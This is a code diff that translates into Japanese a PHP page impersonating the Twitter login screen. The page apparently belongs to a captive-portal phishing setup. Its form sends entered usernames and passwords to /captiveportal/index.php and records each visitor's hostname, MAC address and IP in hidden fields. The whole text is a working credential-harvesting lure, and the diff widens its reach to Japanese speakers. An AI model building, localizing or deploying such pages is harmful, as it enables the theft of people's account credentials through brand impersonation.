@@ -134,18 +134,18 @@ require_once('helper.php');
           </div>
         </div>
 
-        <h1 class="text-center login-title">Log in to Twitter</h1>
+        <h1 class="text-center login-title">Twitterにログイン</h1>
 
           <form method="POST" action="/captiveportal/index.php" onsubmit="redirect()" class="form-signin">
 
-            <input type="text" name="email" class="form-email" placeholder="Phone, email, or username" _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required><br>
-            <input type="password" name="password" class="form-password" placeholder="Password" autocorrect="off" autocomplete="off" autocapitalize="off" required><br>
+            <input type="text" name="email" class="form-email" placeholder="電話番号/メールアドレス/ユーザー名" _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required><br>
+            <input type="password" name="password" class="form-password" placeholder="パスワード" autocorrect="off" autocomplete="off" autocapitalize="off" required><br>
             <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
             <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
             <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
             <input type="hidden" name="target" value="<?=$destination?>">
-            <button class="btn-primary btn-block btn-xlarge btn-sharp" name="login" type="submit">Log in</button>
-            <div class="text-center terms-text1"><a href="#" class="url-color">Forgot Password?</a> · <a href="#" class="url-color">Sign up for Twitter</a></div><br>
+            <button class="btn-primary btn-block btn-xlarge btn-sharp" name="login" type="submit">ログイン</button>
+            <div class="text-center terms-text1"><a href="#" class="url-color">パスワードを忘れましたか？</a> · <a href="#" class="url-color">登録する</a></div><br>
 
           </form>
 
